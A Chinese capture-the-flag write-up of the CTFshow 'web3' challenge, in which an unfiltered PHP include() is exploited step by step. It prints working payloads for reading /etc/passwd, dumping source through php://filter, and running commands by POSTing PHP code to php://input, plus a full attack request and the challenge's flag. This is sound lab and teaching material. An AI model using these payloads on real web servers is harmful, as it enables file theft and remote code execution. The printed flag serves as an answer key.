---
title: "一行 include 的代价：web3 文件包含（LFI → RCE）"
date: 2026-08-19
category: CTF
tags: ["CTF", "Writeup", "Web", "LFI", "RCE"]
summary: "题目源码只有一行 include——从 /etc/passwd 验证到 php://input 拿 RCE，LFI 标准五步全流程。"
draft: false
---

# web3 文件包含（CTFshow）

> 平台: CTFshow web3 | 类型: Web / LFI → RCE | flag: `ctfshow{f5041d83-71cd-4d32-b2e2-60f2da0e2c19}`
> 关联: 2026-08-19-SQL注入入门（同属「用户输入进危险函数」家族）

## 题目形态
主页高亮显示源码：`<?php include($_GET['url']);?>` —— 无任何过滤的 LFI。

## 解题链路（LFI 标准五步）
1. **确认包含**：`?url=/etc/passwd` 出 `/bin/ash`（Alpine 环境）
2. **读源码**：`?url=php://filter/convert.base64-encode/resource=index.php` → base64 解码确认无过滤
   ```php
   <?php
   error_reporting(0);
   $url=$_GET['url'];
   if(isset($url)){ include($url); }
   ?>
   ```
3. **RCE 转换**：`php://input` + POST body `<?php system('ls /'); ?>`（依赖 `allow_url_include=On`）→ 命令执行成功
4. **全盘搜索**：`find / -name "*flag*" 2>/dev/null` → 发现 `/var/www/html/ctf_go_go_go`
5. **cat 取数**：`cat /var/www/html/ctf_go_go_go` → flag

## 关键请求
```
POST /?url=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('find / -name "*flag*" 2>/dev/null'); ?>
```

## 方法论沉淀
1. **LFI 三板斧**：`/etc/passwd` 验证 → `php://filter` 读源码 → `php://input`/`data://` 提权 RCE
2. **环境侦察**：`FLAG=not_flag` 是烟雾弹——**环境变量不可信，全盘 find 才是王道**
3. **怪名字文件**：`ctf_go_go_go` 这种题目风格命名，直接 cat
4. include/require 无过滤 = 拿到 RCE 的高概率入口（检查 `allow_url_include`）

## 常见 flag 藏点清单（本次全空，供下次参考）
`/flag` `/flag.txt` `/tmp/flag*` `flag.php` `/home/www-data/flag` `/root/flag` — 全试过不在，最终在 web 目录怪名文件里
